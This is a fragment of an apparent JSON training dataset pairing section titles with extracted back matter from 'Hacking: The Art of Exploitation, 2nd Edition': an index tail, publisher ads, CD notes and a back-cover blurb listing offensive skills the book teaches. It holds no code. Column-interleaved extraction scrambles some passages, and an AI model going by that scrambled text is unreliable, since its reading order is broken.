script,\nwebserver\n349–350\ntelnet for TCP/IP\nxtool_tinywebd_stealth.sh script, 335\nconnectionto,208\ntinyweb server, 213–217\nZ\nwebserver_id.c file, 212–213\nWEP (Wired Equivalent Privacy), 433, zeroing registers, 294\n434–435 EAX (Accumulator) register, 368\nattacks, 436–449 with polymorphic shellcode, 366\n472 INDEX\nMore No-Nonsense Books from NO STARCH PRESS\nSILENCE ON THE WIRE\nA Field Guide to Passive Reconnaissance and Indirect Attacks\nby MICHAL ZALEWSKI\nSilence on the Wire: A Field Guide to Passive Reconnaissance and Indirect Attacks\nexplains how computers and networks work, how information is processed\nand delivered, and what security threats lurk in the shadows. No humdrum\ntechnical white paper or how-to manual for protecting one’s network, this\nbook is a fascinating narrative that explores a variety of unique, uncommon,\nand often quite elegant security challenges that defy classification and\neschew the traditional attacker-victim model.\nAPRIL 2005, 312 PP., $39.95\nISBN 978-1-59327-046-9\nSECURITY DATA VISUALIZATION\nGraphical Techniques for Network Analysis\nby GREG CONTI\nSecurity Data Visualization is a well-researched and richly illustrated introduc-\ntion to the field of information visualization, a branch of computer science\nconcerned with modeling complex data using interactive images. Greg Conti,\ncreator of the network and security visualization tool RUMINT, shows you\nhow to graph and display network data using a variety of tools so that you can\nunderstand complex datasets at a glance. And once you’ve seen what a network\nattack looks like, you’ll have a better understanding of its low-level behavior—\nlike how vulnerabilities are exploited and how worms and viruses propagate.\nSEPTEMBER 2007, 272 PP., 4-COLOR, $49.95\nISBN 978-1-59327-143-5\nLINUX FIREWALLS\nAttack Detection and Response with iptables, psad, and fwsnort\nby MICHAEL RASH\nLinux Firewalls discusses the technical details of the iptables firewall and the\nNetfilter framework that are built into the Linux kernel, and it explains how\nthey provide strong filtering, Network Address Translation (NAT), state track-\ning, and application layer inspection capabilities that rival many commercial\ntools. You’ll learn how to deploy iptables as an IDS with psad and fwsnort\nandhow to build a strong, passive authentication layer around iptables with\nfwknop. Concrete examples illustrate concepts such as firewall log analysis\nand policies, passive network authentication and authorization, exploit\npacket traces, Snort ruleset emulation, and more.\nOCTOBER 2007, 336 PP., $49.95\nISBN 978-1-59327-141-1\nTHE ART OF ASSEMBLY LANGUAGE\nby RANDALL HYDE\nThe Art of Assembly Language presents assembly language from the high-level\nprogrammer’s point of view, so you can start writing meaningful programs\nwithin days. The High Level Assembler (HLA) that accompanies the book\nisthe first assembler that allows you to write portable assembly language\nprograms that run under either Linux or Windows with nothing more than\narecompile. The CD-ROM includes the HLA and the HLA Standard Library,\nall the source code from the book, and over 50,000 lines of additional sample\ncode, all well-documented and tested. The code compiles and runs as-is\nunder Windows and Linux.\nSEPTEMBER 2003, 928 PP. W/CD, $59.95\nISBN 978-1-886411-97-5\nTHE TCP/IP GUIDE\nA Comprehensive, Illustrated Internet Protocols Reference\nby CHARLES M. KOZIEROK\nThe TCP/IP Guide is a completely up-to-date, encyclopedic reference on\ntheTCP/IP protocol suite that will appeal to newcomers and the seasoned\nprofessional alike. Author Charles Kozierok details the core protocols that\nmake TCP/IP internetworks function and the most important classic TCP/IP\napplications, integrating IPv6 coverage throughout. Over 350 illustrations\nand hundreds of tables help to explain the finer points of this complex topic.\nThe book’s personal, user-friendly writing style lets readers of all levels\nunderstand the dozens of protocols and technologies that run the Internet,\nwith full coverage of PPP, ARP, IP, IPv6, IP NAT, IPSec, Mobile IP, ICMP,\nRIP, BGP, TCP, UDP, DNS, DHCP, SNMP, FTP, SMTP, NNTP, HTTP,\nTelnet, and much more.\nOCTOBER 2005, 1616 PP. hardcover, $89.95\nISBN 978-1-59327-047-6\nPHONE: EMAIL:\n800.420.7240 OR SALES@NOSTARCH.COM\n415.863.9900\nMONDAY THROUGH FRIDAY, WEB:\n9 A.M. TO 5 P.M. (PST) WWW.NOSTARCH.COM\nFAX: MAIL:\n415.863.9950\nNO STARCH PRESS\n24 HOURS A DAY, 555 DE HARO ST, SUITE 250\n7 DAYS A WEEK SAN FRANCISCO, CA 94107\nUSA"
  },
  {
    "input": "Updates; About the CD",
    "output": "U P D A T E S\nVisit http://www.nostarch.com/hacking2.htm for updates, errata, and other\ninformation.\nA B O U T T H E C D\nThe bootable LiveCD provides a Linux-based hacking environment that is\npreconfigured for programming, debugging, manipulating network traffic, and\ncracking encryption. It contains all the source code and applications used in\nthe book. Hacking is about discovery and innovation, and with this LiveCD you\ncan instantly follow along with the book’s examples and explore on your own.\nThe LiveCD can be used in most common personal computers without\ninstalling a new operating system or modifying the computer’s current setup.\nSystem requirements are an x86-based PC with at least 64MB of system memory\nand a BIOS that is configured to boot from a CD-ROM.\n6\n24 = ------\n3\n1 –-\n4\nInternatIonal Best-seller!\ntHe fundamental tecHniques of serious Hacking\nHacking is the art of creative problem solving, j Outsmart common security measures like non-\nwhether that means finding an unconventional executable stacks and intrusion detection systems\nsolution to a difficult problem or exploiting holes in\nj Gain access to a remote server using port-binding\nsloppy programming. Many people call themselves 2nd Edition\nor connect-back shellcode, and alter a server’s log-\nhackers, but few have the strong technical founda-\nging behavior to hide your presence\ntion needed to really push the envelope.\nj Redirect network traffic, conceal open ports, and\nRather than merely showing how to run existing\nhijack TCP connections\nexploits, author Jon Erickson explains how arcane\nhacking techniques actually work. To share the art j Crack encrypted wireless traffic using the FMS\nand science of hacking in a way that is accessible attack, and speed up brute-force attacks using a\nto everyone, Hacking: The Art of Exploitation, 2nd password probability matrix H a c k i n g\nEdition introduces the fundamentals of C program-\nHackers are always pushing the boundaries, inves-\nming from a hacker’s perspective.\ntigating the unknown, and evolving their art. Even\nThe included LiveCD provides a complete Linux if you don’t already know how to program, Hacking:\nprogramming and debugging environment—all The Art of Exploitation, 2nd Edition will give you a\nwithout modifying your current operating system. complete picture of programming, machine archi-\nUse it to follow along with the book’s examples as tecture, network communications, and existing\nyou fill gaps in your knowledge and explore hack- hacking techniques. Combine this knowledge with\ning techniques on your own. Get your hands dirty the included Linux environment, and all you need is\ndebugging code, overflowing buffers, hijacking your own creativity. the art of exploitation\nnetwork communications, bypassing protections,\nabout the author\nexploiting cryptographic weaknesses, and perhaps\neven inventing new exploits. This book will teach\nJon Erickson has a formal education in computer\nyou how to:\nscience and has been hacking and programming\nj Program computers using C, assembly language, since he was five years old. He speaks at com-\nand shell scripts puter security conferences and trains security\nteams around the world. Currently, he works as a\nj Corrupt system memory to run arbitrary code\nvulnerability researcher and security specialist in\nusing buffer overflows and format strings\nNorthern California.\njon erickson\nj Inspect processor registers and system memory\nwith a debugger to gain a real understanding of\nwhat is happening\nlivecd provides a complete linux programming and debugging environment\nerickson\n$49.95 ($54.95 cdn)\nTHE FINEST IN GEEK ENTERTAINMENT™\nwww.nostarch.com shelve in : computer security/network security\n“I LAY FLAT.”\nThis book uses RepKover—a durable binding that won’t snap shut.\nPrinted on recycled paper\nHacking\nthe\nart\nof\nexploitation\ncD insiDe\ncD insiDe\n2nd Edition"
  }
]